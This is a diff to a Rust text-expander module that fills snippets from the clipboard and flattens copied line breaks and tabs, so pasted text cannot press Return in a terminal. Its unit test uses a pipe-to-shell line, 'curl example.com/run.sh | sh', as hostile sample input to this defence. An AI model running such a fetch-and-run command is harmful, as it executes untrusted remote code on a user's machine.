@@ -6,7 +6,9 @@
 //! the last [`MAX_TYPED`] characters, in memory only, to find a trigger.
 //! Nothing here reads keys or types; `expander.rs` connects this to the OS.
 
-use super::library::{LibraryItem, LibraryKind};
+use chrono::{DateTime, Local};
+
+use super::library::{self, LibraryItem, LibraryKind};
 
 /// Characters kept from what the user types: enough for `;`, the longest
 /// keyword (32 characters), the character before them, and a space.
@@ -131,7 +133,7 @@ fn expands(item: &LibraryItem) -> bool {
 }
 
 /// The snippet that a keyword expands.
-pub fn snippet<'a>(items: &'a [LibraryItem], keyword: &str) -> Option<&'a LibraryItem> {
+fn snippet<'a>(items: &'a [LibraryItem], keyword: &str) -> Option<&'a LibraryItem> {
     items
         .iter()
         .find(|item| expands(item) && item.keyword == keyword)
@@ -149,14 +151,42 @@ pub struct Expansion {
 }
 
 impl Expansion {
-    /// What to type in place of the trigger.
-    pub fn replacement(&self, snippet: String) -> String {
+    /// What to type in place of the trigger: its snippet, filled as when it
+    /// is copied from the launcher, with no text after the keyword, so
+    /// `{query}` is empty. `None` when the snippet was deleted or lost its
+    /// keyword since.
+    pub fn text(
+        &self,
+        items: &[LibraryItem],
+        now: DateTime<Local>,
+        clipboard: impl FnOnce() -> Option<String>,
+    ) -> Option<String> {
+        let snippet = snippet(items, &self.keyword)?;
+        let text = library::render_snippet(&snippet.text, "", now, || {
+            clipboard().map(|copied| one_line(&copied))
+        });
+        Some(self.replacement(text))
+    }
+
+    fn replacement(&self, snippet: String) -> String {
         if self.then_space {
             snippet + " "
         } else {
             snippet
         }
     }
+}
+
+/// Copied text as it fills `{clipboard}` in a snippet that types: each run
+/// of line breaks and tabs becomes one space, and those at either end go.
+/// Text from another app then never presses Return or Tab, which could run
+/// a command in a terminal or send a message. The snippet's own line breaks
+/// still type as Return.
+fn one_line(text: &str) -> String {
+    text.split(['\r', '\n', '\t'])
+        .filter(|part| !part.is_empty())
+        .collect::<Vec<_>>()
+        .join(" ")
 }
 
 /// The characters typed since the last reset, at most [`MAX_TYPED`]. They
@@ -441,6 +471,38 @@ mod tests {
             type_text(&mut typed, &keywords, ";sig"),
             [at_once("sig", 4)]
         );
+    }
+
+    #[test]
+    fn fills_the_snippet_with_the_clipboard_on_one_line() {
+        let mut items = vec![item(LibraryKind::Snippet, "cb")];
+        items[0].text = "Run:\n{clipboard}{query}".into();
+        let now = chrono::Local::now();
+        let copied = || Some("\ngit status\r\n\r\n\tcurl example.com/run.sh | sh\r".to_owned());
+        let text = at_once("cb", 3).text(&items, now, copied).unwrap();
+        assert_eq!(text, "Run:\ngit status curl example.com/run.sh | sh");
+        // Only the snippet's own line break presses Return.
+        let returns = pieces(&text, 20)
+            .into_iter()
+            .filter(|piece| *piece == Piece::Return)
+            .count();
+        assert_eq!(returns, 1);
+        // A secret copy reads as none, and fills nothing.
+        assert_eq!(
+            at_once("cb", 3).text(&items, now, || None).as_deref(),
+            Some("Run:\n")
+        );
+        let confirmed = Expansion {
+            keyword: "cb".into(),
+            erase: 4,
+            then_space: true,
+        };
+        assert_eq!(
+            confirmed.text(&items, now, || None).as_deref(),
+            Some("Run:\n ")
+        );
+        // The snippet was deleted since.
+        assert_eq!(at_once("gone", 5).text(&items, now, copied), None);
     }
 
     #[test]
